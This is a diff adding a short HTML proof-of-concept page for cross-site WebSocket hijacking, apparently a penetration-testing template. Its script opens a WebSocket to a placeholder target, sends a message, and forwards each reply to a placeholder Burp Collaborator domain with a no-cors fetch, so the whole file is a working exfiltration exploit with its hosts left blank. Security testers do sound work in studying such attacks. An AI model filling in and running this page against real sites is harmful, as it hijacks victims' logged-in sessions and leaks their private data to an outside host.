@@ -1,0 +1,17 @@
+<html>
+    <body>
+        <h1>Cross-Site WebSocket hijacking POC</h1>
+<script>
+websocket = new WebSocket('wss://websocket_URL')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  websocket.send("websocket TEXT after protocol switch handshake");
+}
+function handleReply(event) {
+  fetch('https://Burp_Collaborator_Domain/?'+event.data, {mode: 'no-cors'})
+}
+</script>
+</body>
+</html>
+
